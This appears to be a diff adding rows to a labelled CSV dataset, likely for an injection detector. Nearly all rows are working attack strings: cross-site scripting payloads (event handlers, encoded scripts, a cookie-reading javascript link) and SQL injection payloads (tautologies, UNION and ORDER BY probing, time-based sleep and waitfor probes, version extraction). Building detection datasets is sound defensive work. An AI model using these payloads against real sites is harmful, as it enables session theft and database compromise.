+"<style>:target {color: red;}</style><ol id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></ol>",0
+<small id=x tabindex=1 onbeforedeactivate=alert(1)></small><input autofocus>,0
+"<samp oncopy=alert(1) value=""XSS"" autofocus tabindex=1>test",0
+"<style>:target {transform: rotate(180deg);}</style><menu id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></menu>",0
+"<dt draggable=""true"" ondragenter=""alert(1)"">test</dt>",0
+"<style>:target {color:red;}</style><animate id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></animate>",0
+<var onfocusout=alert(1) tabindex=1 id=x></var><input autofocus>,0
+"<thead onmousemove=""alert(1)"">test</thead>",0
+"<style>@keyframes x{}</style><thead style=""animation-name:x"" onwebkitanimationend=""alert(1)""></thead>",0
+"<picture onmouseleave=""alert(1)"">test</picture>",0
+"<style>:target {transform: rotate(180deg);}</style><img id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></img>",0
+"<progress onmousemove=""alert(1)"">test</progress>",0
+"<style>@keyframes x{}</style><textarea style=""animation-name:x"" onwebkitanimationend=""alert(1)""></textarea>",0
+"<slot onmouseleave=""alert(1)"">test</slot>",0
+"<style>:target {color:red;}</style><table id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></table>",0
+<source id=x tabindex=1 onfocusin=alert(1)></source>,0
+"<script oncut=alert(1) value=""XSS"" autofocus tabindex=1>test",0
+"<style>:target {transform: rotate(180deg);}</style><caption id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></caption>",0
+"<th onmouseout=""alert(1)"">test</th>",0
+"<track ondblclick=""alert(1)"" autofocus tabindex=1>test</track>",0
+<basefont id=x tabindex=1 onbeforedeactivate=alert(1)></basefont><input autofocus>,0
+"<style>@keyframes slidein {}</style><animatetransform style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></animatetransform>",0
+"<style>:target {color:red;}</style><picture id=x style=""transition:color 1s"" ontransitionstart=alert(1)></picture>",0
+<shadow onpointerout=alert(1)>XSS</shadow>,0
+<article id=x tabindex=1 ondeactivate=alert(1)></article><input id=y autofocus>,0
+"<textarea oncopy=alert(1) value=""XSS"" autofocus tabindex=1>test",0
+"<style>@keyframes x{}</style><ruby style=""animation-name:x"" onanimationstart=""alert(1)""></ruby>",0
+<tfoot onpointerout=alert(1)>XSS</tfoot>,0
+"<style>@keyframes slidein {}</style><ins style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></ins>",0
+"<style ondblclick=""alert(1)"" autofocus tabindex=1>test</style>",0
+<rt onpointerenter=alert(1)>XSS</rt>,0
+<dialog id=x tabindex=1 onfocusin=alert(1)></dialog>,0
+"<style>@keyframes x{}</style><summary style=""animation-name:x"" onanimationstart=""alert(1)""></summary>",0
+"<style>@keyframes slidein {}</style><base style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></base>",0
+"<style>:target {color:red;}</style><output id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></output>",0
+"<ul onbeforepaste=""alert(1)"" contenteditable>test</ul>",0
+"<strong onbeforepaste=""alert(1)"" contenteditable>test</strong>",0
+"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><applet id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></applet>",0
+"<style>@keyframes slidein {}</style><bdo style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></bdo>",0
+"<sub onkeydown=""alert(1)"" contenteditable>test</sub>",0
+<tt id=x tabindex=1 ondeactivate=alert(1)></tt><input id=y autofocus>,0
+"<style>@keyframes x{}</style><iframe2 style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></iframe2>",0
+"<style>:target {color:red;}</style><tr id=x style=""transition:color 1s"" ontransitionstart=alert(1)></tr>",0
+"<dir onmouseup=""alert(1)"">test</dir>",0
+"<output onmousemove=""alert(1)"">test</output>",0
+"<style>@keyframes x{}</style><output style=""animation-name:x"" onanimationend=""alert(1)""></output>",0
+<tbody onpointerenter=alert(1)>XSS</tbody>,0
+"<style>:target {color: red;}</style><rtc id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></rtc>",0
+"<video2 oncopy=alert(1) value=""XSS"" autofocus tabindex=1>test",0
+"<p onmousemove=""alert(1)"">test</p>",0
+"<style>:target {transform: rotate(180deg);}</style><style id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></style>",0
+"<style>:target {color:red;}</style><input2 id=x style=""transition:color 1s"" ontransitionend=alert(1)></input2>",0
+"<s onbeforecopy=""alert(1)"" contenteditable>test</s>",0
+"<style>@keyframes x{}</style><nobr style=""animation-name:x"" onwebkitanimationend=""alert(1)""></nobr>",0
+"<style>:target {color:red;}</style><meta id=x style=""transition:color 1s"" ontransitionstart=alert(1)></meta>",0
+"<iframe src=%22404%22 onload=%22frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>",0
+"<svg onmousedown=""alert(1)"">test</svg>",0
+"<style>:target {color: red;}</style><meter id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></meter>",0
+"<output onkeyup=""alert(1)"" contenteditable>test</output>",0
+<blink onpointerrawupdate=alert(1)>XSS</blink>,0
+"<style onkeyup=""alert(1)"" contenteditable>test</style>",0
+"<dialog onkeypress=""alert(1)"" contenteditable>test</dialog>",0
+"<style>@keyframes x{}</style><menuitem style=""animation-name:x"" onanimationend=""alert(1)""></menuitem>",0
+"<style>@keyframes x{}</style><li style=""animation-name:x"" onanimationstart=""alert(1)""></li>",0
+"<u draggable=""true"" ondragstart=""alert(1)"">test</u>",0
+"<track onmouseenter=""alert(1)"">test</track>",0
+"<title oncontextmenu=""alert(1)"">test</title>",0
+"<q onmouseout=""alert(1)"">test</q>",0
+"<samp onmouseout=""alert(1)"">test</samp>",0
+<dl onpointermove=alert(1)>XSS</dl>,0
+<article onmousewheel=alert(1)>requires scrolling,0
+"<style onbeforepaste=""alert(1)"" contenteditable>test</style>",0
+<b onpointerrawupdate=alert(1)>XSS</b>,0
+<section id=x tabindex=1 onactivate=alert(1)></section>,0
+<ruby onpointerup=alert(1)>XSS</ruby>,0
+"<style>:target {color:red;}</style><center id=x style=""transition:color 1s"" ontransitionstart=alert(1)></center>",0
+<applet onpointerdown=alert(1)>XSS</applet>,0
+"<button ondblclick=""alert(1)"" autofocus tabindex=1>test</button>",0
+"<style>@keyframes slidein {}</style><input2 style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></input2>",0
+<s onpointerleave=alert(1)>XSS</s>,0
+"<style>@keyframes x{}</style><nobr style=""animation-name:x"" onanimationend=""alert(1)""></nobr>",0
+"<style>@keyframes x{}</style><figure style=""animation-name:x"" onwebkitanimationend=""alert(1)""></figure>",0
+"<style>:target {color:red;}</style><p id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></p>",0
+"<select onclick=""alert(1)"">test</select>",0
+"<rb onclick=""alert(1)"">test</rb>",0
+<param id=x tabindex=1 onfocus=alert(1)></param>,0
+<audio2 id=x tabindex=1 onbeforedeactivate=alert(1)></audio2><input autofocus>,0
+"<style>:target {color:red;}</style><label id=x style=""transition:color 1s"" ontransitionstart=alert(1)></label>",0
+"<style>:target {color:red;}</style><h1 id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></h1>",0
+"<basefont draggable=""true"" ondragstart=""alert(1)"">test</basefont>",0
+"<applet onmousemove=""alert(1)"">test</applet>",0
+<dir id=x tabindex=1 onactivate=alert(1)></dir>,0
+<svg onpointerdown=alert(1)>XSS</svg>,0
+"<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script ????????????",0
+<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>,0
+"<style>@keyframes x{}</style><nav style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></nav>",0
+"<q onkeydown=""alert(1)"" contenteditable>test</q>",0
+"<style>:target {color:red;}</style><th id=x style=""transition:color 1s"" ontransitionend=alert(1)></th>",0
+"<style>:target {color:red;}</style><option id=x style=""transition:color 1s"" ontransitionend=alert(1)></option>",0
+<td onpointerup=alert(1)>XSS</td>,0
+"<style>@keyframes slidein {}</style><label style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></label>",0
+<progress onbeforescriptexecute=alert(1)><script>1</script>,0
+<s id=x tabindex=1 onbeforeactivate=alert(1)></s>,0
+"<style>@keyframes x{}</style><source style=""animation-name:x"" onanimationend=""alert(1)""></source>",0
+<progress id=x tabindex=1 ondeactivate=alert(1)></progress><input id=y autofocus>,0
+<rtc onpointerdown=alert(1)>XSS</rtc>,0
+<td onafterscriptexecute=alert(1)><script>1</script>,0
+<template onmousewheel=alert(1)>requires scrolling,0
+<table id=x tabindex=1 onactivate=alert(1)></table>,0
+<small onpointerenter=alert(1)>XSS</small>,0
+"<dt ondblclick=""alert(1)"" autofocus tabindex=1>test</dt>",0
+"<dir onmousedown=""alert(1)"">test</dir>",0
+"<element onmouseup=""alert(1)"">test</element>",0
+"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><li id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></li>",0
+"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><span id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></span>",0
+<strike onblur=alert(1) tabindex=1 id=x></strike><input autofocus>,0
+<rtc onfocusout=alert(1) tabindex=1 id=x></rtc><input autofocus>,0
+"<style>:target {transform: rotate(180deg);}</style><image3 id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></image3>",0
+"<thead onpaste=""alert(1)"" contenteditable>test</thead>",0
+<tfoot onmousewheel=alert(1)>requires scrolling,0
+"<button oncontextmenu=""alert(1)"">test</button>",0
+"<q ondblclick=""alert(1)"" autofocus tabindex=1>test</q>",0
+<template onpointerenter=alert(1)>XSS</template>,0
+<script>alert(document.documentElement.innerHTML.match(/'([^']%2b)/)[1])</script>,0
+<dialog onpointermove=alert(1)>XSS</dialog>,0
+<tbody onbeforescriptexecute=alert(1)><script>1</script>,0
+"<plaintext ondblclick=""alert(1)"" autofocus tabindex=1>test</plaintext>",0
+"<address draggable=""true"" ondragleave=""alert(1)"">test</address>",0
+<small id=x tabindex=1 onbeforeactivate=alert(1)></small>,0
+"<rb onbeforepaste=""alert(1)"" contenteditable>test</rb>",0
+"<tfoot draggable=""true"" ondragleave=""alert(1)"">test</tfoot>",0
+"<style>@keyframes slidein {}</style><a2 style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></a2>",0
+"<article onmousemove=""alert(1)"">test</article>",0
+"<p onpaste=""alert(1)"" contenteditable>test</p>",0
+"<animatemotion draggable=""true"" ondragstart=""alert(1)"">test</animatemotion>",0
+"<style>:target {color:red;}</style><frameset id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></frameset>",0
+<summary id=x tabindex=1 onfocus=alert(1)></summary>,0
+<q id=x tabindex=1 ondeactivate=alert(1)></q><input id=y autofocus>,0
+"<style>:target {transform: rotate(180deg);}</style><blink id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></blink>",0
+"<strike onmouseup=""alert(1)"">test</strike>",0
+<wbr id=x tabindex=1 onfocus=alert(1)></wbr>,0
+"<style>@keyframes x{}</style><rt style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></rt>",0
+"<textarea onmousedown=""alert(1)"">test</textarea>",0
+"<style>@keyframes x{}</style><fieldset style=""animation-name:x"" onanimationend=""alert(1)""></fieldset>",0
+"<applet onmouseout=""alert(1)"">test</applet>",0
+"<style>@keyframes x{}</style><blockquote style=""animation-name:x"" onwebkitanimationend=""alert(1)""></blockquote>",0
+"<style>:target {color:red;}</style><keygen id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></keygen>",0
+<s onpointerrawupdate=alert(1)>XSS</s>,0
+"<dt onmouseover=""alert(1)"">test</dt>",0
+"<style>@keyframes x{}</style><image2 style=""animation-name:x"" onwebkitanimationend=""alert(1)""></image2>",0
+<dt onpointerup=alert(1)>XSS</dt>,0
+"<style>@keyframes slidein {}</style><output style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></output>",0
+<wbr onbeforescriptexecute=alert(1)><script>1</script>,0
+"<q draggable=""true"" ondrag=""alert(1)"">test</q>",0
+"<rt onbeforecopy=""alert(1)"" contenteditable>test</rt>",0
+"<ul draggable=""true"" ondragstart=""alert(1)"">test</ul>",0
+<dl onpointerleave=alert(1)>XSS</dl>,0
+<tbody id=x tabindex=1 onbeforedeactivate=alert(1)></tbody><input autofocus>,0
+"<video onmouseleave=""alert(1)"">test</video>",0
+"<xmp onmouseout=""alert(1)"">test</xmp>",0
+<dt onmousewheel=alert(1)>requires scrolling,0
+<title id=x tabindex=1 onbeforeactivate=alert(1)></title>,0
+<p id=x tabindex=1 onfocusin=alert(1)></p>,0
+<th onbeforescriptexecute=alert(1)><script>1</script>,0
+"<style>@keyframes x{}</style><video2 style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></video2>",0
+<animatemotion onpointerout=alert(1)>XSS</animatemotion>,0
+"<style>@keyframes x{}</style><image3 style=""animation-name:x"" onwebkitanimationend=""alert(1)""></image3>",0
+"<time oncut=alert(1) value=""XSS"" autofocus tabindex=1>test",0
+<textarea onselect=alert(1) autofocus>XSS</textarea>,0
+<shadow onblur=alert(1) tabindex=1 id=x></shadow><input autofocus>,0
+"<blink oncopy=alert(1) value=""XSS"" autofocus tabindex=1>test",0
+<svg id=x tabindex=1 onbeforedeactivate=alert(1)></svg><input autofocus>,0
+"<body onkeydown=""alert(1)"" contenteditable>test</body>",0
+"<animatetransform onmouseenter=""alert(1)"">test</animatetransform>",0
+"<style>@keyframes slidein {}</style><keygen style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></keygen>",0
+"<style>:target {transform: rotate(180deg);}</style><mark id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></mark>",0
+<slot id=x tabindex=1 ondeactivate=alert(1)></slot><input id=y autofocus>,0
+<rtc id=x tabindex=1 onfocus=alert(1)></rtc>,0
+<area id=x tabindex=1 ondeactivate=alert(1)></area><input id=y autofocus>,0
+"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><nextid id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></nextid>",0
+"<acronym draggable=""true"" ondrag=""alert(1)"">test</acronym>",0
+<video onmousewheel=alert(1)>requires scrolling,0
+<tfoot id=x tabindex=1 onactivate=alert(1)></tfoot>,0
+"<style>@keyframes x{}</style><blockquote style=""animation-name:x"" onanimationstart=""alert(1)""></blockquote>",0
+"<style>@keyframes x{}</style><title style=""animation-name:x"" onwebkitanimationend=""alert(1)""></title>",0
+"<spacer draggable=""true"" ondrag=""alert(1)"">test</spacer>",0
+"<svg ondblclick=""alert(1)"" autofocus tabindex=1>test</svg>",0
+"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><style id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></style>",0
+<blockquote id=x tabindex=1 onfocusin=alert(1)></blockquote>,0
+"<style>:target {color: red;}</style><noembed id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></noembed>",0
+"<style>@keyframes x{}</style><figure style=""animation-name:x"" onanimationend=""alert(1)""></figure>",0
+<tfoot onpointermove=alert(1)>XSS</tfoot>,0
+"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><element id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></element>",0
+"<summary draggable=""true"" ondragleave=""alert(1)"">test</summary>",0
+"<style>:target {color: red;}</style><summary id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></summary>",0
+"<style>:target {color:red;}</style><big id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></big>",0
+"<style>@keyframes slidein {}</style><picture style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></picture>",0
+"<script onkeydown=""alert(1)"" contenteditable>test</script>",0
+"<style>@keyframes slidein {}</style><rp style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></rp>",0
+"<canvas draggable=""true"" ondrag=""alert(1)"">test</canvas>",0
+<spacer id=x tabindex=1 ondeactivate=alert(1)></spacer><input id=y autofocus>,0
+"<blink onmouseenter=""alert(1)"">test</blink>",0
+<canvas onblur=alert(1) tabindex=1 id=x></canvas><input autofocus>,0
+"<style>:target {color: red;}</style><em id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></em>",0
+<animate onbeforescriptexecute=alert(1)><script>1</script>,0
+"<style>@keyframes x{}</style><q style=""animation-name:x"" onanimationstart=""alert(1)""></q>",0
+<plaintext id=x tabindex=1 onfocus=alert(1)></plaintext>,0
+"<style>:target {transform: rotate(180deg);}</style><object id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></object>",0
+"<sub draggable=""true"" ondragenter=""alert(1)"">test</sub>",0
+"<style>@keyframes x{}</style><i style=""animation-name:x"" onanimationend=""alert(1)""></i>",0
+"<style>@keyframes x{}</style><input4 style=""animation-name:x"" onwebkitanimationend=""alert(1)""></input4>",0
+"<style>:target {color: red;}</style><plaintext id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></plaintext>",0
+"<element onmouseleave=""alert(1)"">test</element>",0
+"<abbr oncut=alert(1) value=""XSS"" autofocus tabindex=1>test",0
+<summary onpointermove=alert(1)>XSS</summary>,0
+"<thead draggable=""true"" ondrag=""alert(1)"">test</thead>",0
+"<iframe src=%22404%22 onload=%22top.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>",0
+"<body draggable=""true"" ondragenter=""alert(1)"">test</body>",0
+"<dir onmouseout=""alert(1)"">test</dir>",0
+<blockquote onmousewheel=alert(1)>requires scrolling,0
+"<video controls autoplay onended=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",0
+<strong onpointerover=alert(1)>XSS</strong>,0
+"<video onbeforecut=""alert(1)"" contenteditable>test</video>",0
+"<style>@keyframes slidein {}</style><bgsound style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></bgsound>",0
+<element id=x tabindex=1 onfocusin=alert(1)></element>,0
+"<table onmouseout=""alert(1)"">test</table>",0
+"<style>@keyframes slidein {}</style><sub style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></sub>",0
+<s onafterscriptexecute=alert(1)><script>1</script>,0
+"<var onmousedown=""alert(1)"">test</var>",0
+<svg><animatetransform onbegin=alert(1) attributeName=transform>,0
+"<style>@keyframes x{}</style><em style=""animation-name:x"" onanimationend=""alert(1)""></em>",0
+"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><form id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></form>",0
+"<picture oncopy=alert(1) value=""XSS"" autofocus tabindex=1>test",0
+"<samp oncontextmenu=""alert(1)"">test</samp>",0
+"<source onmouseout=""alert(1)"">test</source>",0
+<input value=<><iframe/src=javascript:confirm(1),0
+"<style>@keyframes x{}</style><kbd style=""animation-name:x"" onanimationstart=""alert(1)""></kbd>",0
+<tr id=x tabindex=1 onbeforeactivate=alert(1)></tr>,0
+"<style>@keyframes x{}</style><small style=""animation-name:x"" onanimationstart=""alert(1)""></small>",0
+"<style>@keyframes x{}</style><body style=""animation-name:x"" onanimationend=""alert(1)""></body>",0
+"<blockquote oncontextmenu=""alert(1)"">test</blockquote>",0
+<rb id=x tabindex=1 onbeforedeactivate=alert(1)></rb><input autofocus>,0
+"<rtc onkeypress=""alert(1)"" contenteditable>test</rtc>",0
+"<spacer onbeforepaste=""alert(1)"" contenteditable>test</spacer>",0
+"<style>@keyframes slidein {}</style><header style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></header>",0
+"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><sup id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></sup>",0
+"<style onmouseleave=""alert(1)"">test</style>",0
+<samp onblur=alert(1) tabindex=1 id=x></samp><input autofocus>,0
+"<div draggable=""true"" contenteditable>drag me</div><acronym ondragover=alert(1) contenteditable>drop here</acronym>",0
+"<tbody draggable=""true"" ondragleave=""alert(1)"">test</tbody>",0
+"<style>@keyframes x{}</style><xmp style=""animation-name:x"" onanimationstart=""alert(1)""></xmp>",0
+"<tfoot onpaste=""alert(1)"" contenteditable>test</tfoot>",0
+"<style>@keyframes x{}</style><table style=""animation-name:x"" onanimationstart=""alert(1)""></table>",0
+<video2 id=x tabindex=1 onactivate=alert(1)></video2>,0
+"<applet onclick=""alert(1)"">test</applet>",0
+<dt id=x tabindex=1 onactivate=alert(1)></dt>,0
+<slot onafterscriptexecute=alert(1)><script>1</script>,0
+',1
+`,1
+``,1
+",",1
+"""",1
+"""""",1
+/,1
+//,1
+\,1
+\\,1
+;,1
+" or """,1
+-- or #,1
+ OR '1,1
+ OR 1 -- -,1
+""" OR """" = """,1
+""" OR 1 = 1 -- -",1
+ OR '' = ',1
+=',1
+LIKE',1
+=0--+,1
+OR 1=1,1
+ OR 'x'='x,1
+ AND id IS NULL; --,1
+''''''''''''UNION SELECT '2,1
+AND 1,1
+AND 0,1
+AND true,1
+AND false,1
+1-false,1
+1-true,1
+1*56,1
+1' ORDER BY 1--+,1
+1' ORDER BY 2--+,1
+1' ORDER BY 3--+,1
+"1' ORDER BY 1,2--+",1
+"1' ORDER BY 1,2,3--+",1
+"1' GROUP BY 1,2,--+",1
+"1' GROUP BY 1,2,3--+",1
+ GROUP BY columnnames having 1=1 --,1
+"-1' UNION SELECT 1,2,3--+",1
+ UNION SELECT sum(columnname ) from tablename --,1
+"-1 UNION SELECT 1 INTO @,@",1
+"-1 UN   ION SELECT 1 INTO @,@,@",1
+1 AND (SELECT * FROM Users) = 1,1
+" AND MID(VERSION(),1,1) = '5';",1
+ and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --,1
+",(select * from (select(sleep(10)))a)",1
+%2c(select%20*%20from%20(select(sleep(10)))a),1
+;WAITFOR DELAY '0:0:30'--,1
+OR 1=1,1
+OR 1=0,1
+OR x=x,1
+OR x=y,1
+OR 1=1#,1
+OR 1=0#,1
+OR x=x#,1
+OR x=y#,1
+OR 1=1--,1
+OR 1=0--,1
+OR x=x--,1
+OR x=y--,1
+OR 3409=3409 AND ('pytW' LIKE 'pytW,1
+OR 3409=3409 AND ('pytW' LIKE 'pytY,1
+HAVING 1=1,1
+HAVING 1=0,1
+HAVING 1=1#,1
+HAVING 1=0#,1
+HAVING 1=1--,1
+HAVING 1=0--,1
+AND 1=1,1
+AND 1=0,1
+AND 1=1--,1
+AND 1=0--,1
+AND 1=1#,1
+AND 1=0#,1
+AND 1=1 AND '%'=',1
+AND 1=0 AND '%'=',1
+AND 1083=1083 AND (1427=1427,1
+AND 7506=9091 AND (5913=5913,1
+AND 1083=1083 AND ('1427=1427,1
+AND 7506=9091 AND ('5913=5913,1
+AND 7300=7300 AND 'pKlZ'='pKlZ,1
+AND 7300=7300 AND 'pKlZ'='pKlY,1
+AND 7300=7300 AND ('pKlZ'='pKlZ,1
+AND 7300=7300 AND ('pKlZ'='pKlY,1
+AS INJECTX WHERE 1=1 AND 1=1,1
+AS INJECTX WHERE 1=1 AND 1=0,1
+AS INJECTX WHERE 1=1 AND 1=1#,1
+AS INJECTX WHERE 1=1 AND 1=0#,1
+AS INJECTX WHERE 1=1 AND 1=1--,1
+AS INJECTX WHERE 1=1 AND 1=0--,1
+WHERE 1=1 AND    1=1,1
+WHERE 1=1 AND 1=0,1
+WHERE 1=1 AND 1=1#,1
+WHERE 1=1 AND 1=0#,1
+WHERE 1=1 AND 1=1--,1
+WHERE 1=1 AND 1=0--,1
+ORDER BY 1--,1
+ORDER BY 2--,1
+ORDER BY 3--,1
+ORDER BY 4--,1
+ORDER BY 5--,1
+ORDER BY 6--,1
+ORDER BY 7--,1
+ORDER BY 8--,1
+ORDER BY 9--,1
+ORDER BY 10--,1
+ORDER BY 11--,1
+ORDER BY 12--,1
+ORDER BY 13--,1
+ORDER BY 14--,1
+ORDER BY 15--,1
+ORDER BY 16--,1
+ORDER BY 17--,1
+ORDER BY 18--,1
+ORDER BY 19--,1
+ORDER BY 20--,1
+ORDER BY 21--,1
+ORDER BY 22--,1
+ORDER BY 23--,1
+ORDER BY 24--,1
+ORDER BY 25--,1
+ORDER BY 26--,1
+ORDER BY 27--,1
+ORDER BY 28--,1
+ORDER BY 29--,1
+ORDER BY 30--,1
+ORDER BY 31337--,1
+ORDER BY 1#,1
+ORDER BY 2#,1
+ORDER BY 3#,1
+ORDER BY 4#,1
+ORDER BY 5#,1
+ORDER BY 6#,1
+ORDER BY 7#,1
+ORDER BY 8#,1
+ORDER BY 9#,1
+ORDER BY 10#,1
+ORDER BY 11#,1
+ORDER BY 12#,1
+ORDER BY 13#,1
+ORDER BY 14#  ORDER BY 15#,1
+ORDER BY 16#,1
+ORDER BY 17#,1
+ORDER BY 18#,1
+ORDER BY 19#,1
+ORDER BY 20#,1
+ORDER BY 21#,1
+ORDER BY 22#,1
+ORDER BY 23#,1
+ORDER BY 24#,1
+ORDER BY 25#,1
+ORDER BY 26#,1
+ORDER BY 27#,1
+ORDER BY 28#,1
+ORDER BY 29#,1
+ORDER BY 30#,1
+ORDER BY 31337#,1
+ORDER BY 1,1
+ORDER BY 2,1
+ORDER BY 3,1
+ORDER BY 4,1
+ORDER BY 5,1
+ORDER BY 6,1
+ORDER BY 7,1
+ORDER BY 8,1
+ORDER BY 9,1
+ORDER BY 10,1
+ORDER BY 11,1
+ORDER BY 12,1
+ORDER BY 13,1
+ORDER BY 14,1
+ORDER BY 15,1
+ORDER BY 16,1
+ORDER BY 17,1
+ORDER BY 18,1
+ORDER BY 19,1
+ORDER BY 20,1
+ORDER BY 21,1
+ORDER BY 22,1
+ORDER BY 23,1
+ORDER BY 24,1
+ORDER BY 25,1
+ORDER BY 26,1
+ORDER BY 27,1
+ORDER BY 28,1
+ORDER BY 29,1
+ORDER BY 30,1
+ORDER BY 31337,1
+RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=',1
+RLIKE (SELECT (CASE WHEN (43   46=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=',1
+IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--,1
+IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--,1
+%' AND 8310=8310 AND '%'=',1
+%' AND 8310=8311 AND '%'=',1
+"and (select substring(@@version,1,1))='X'",1
+"and (select substring(@@version,1,1))='M'",1
+"and (select substring(@@version,2,1))='i'",1
+"and (select substring(@@version,2,1))='y'",1
+"and (select substring(@@version,3,1))='c'",1
+"and (select substring(@@version,3,1))='S'",1
+"and (select substring(@@version,3,1))='X'",1
+sleep(5)#,1
+1 or sleep(5)#,1
+""" or sleep(5)#",1
+ or sleep(5)#,1
+""" or sleep(5)=""",1
+ or sleep(5)=',1
+1) or sleep(5)#,1
+""") or sleep(5)=""",1
+) or sleep(5)=',1
+1)) or sleep(5)#,1
+""")) or sleep(5)=""",1
+)) or sleep(5)=',1
+;waitfor delay '0:0:5'--,1
+);waitfor delay '0:0:5'--,1
+;waitfor delay '0:0:5'--,1
+""";waitfor delay '0:0:5'--",1
+);waitfor delay '0:0:5'--,1
+""");waitfor delay '0:0:5'--",1
+));waitfor delay '0:0:5'--,1
+));waitfor delay '0:0:5'--,1
+"""));waitfor delay '0:0:5'--",1
+"benchmark(10000000,MD5(1))#",1
+"1 or benchmark(10000000,MD5(1))#",1
+""" or benchmark(10000000,MD5(1))#",1
+" or benchmark(10000000,MD5(1))#",1
+"1) or benchmark(10000000,MD5(1))#",1
+""") or benchmark(10000000,MD5(1))#",1
+") or benchmark(10000000,MD5(1))#",1
+"1)) or benchmark(10000000,MD5(1))#",1
+""")) or benchmark(10000000,MD5(1))#",1
+")) or benchmark(10000000,MD5(1))#",1
+pg_sleep(5)--,1
+1 or pg_sleep(5)--,1
+""" or pg_sleep(5)--",1
+ or pg_sleep(5)-   -,1
+1) or pg_sleep(5)--,1
+""") or pg_sleep(5)--",1
+) or pg_sleep(5)--,1
+1)) or pg_sleep(5)--,1
+""")) or pg_sleep(5)--",1
+)) or pg_sleep(5)--,1
+AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe,1
+AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'=',1
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP),1
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--,1
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#,1
+SLEEP(5)#,1
+SLEEP(5)--,1
+"SLEEP(5)=""",1
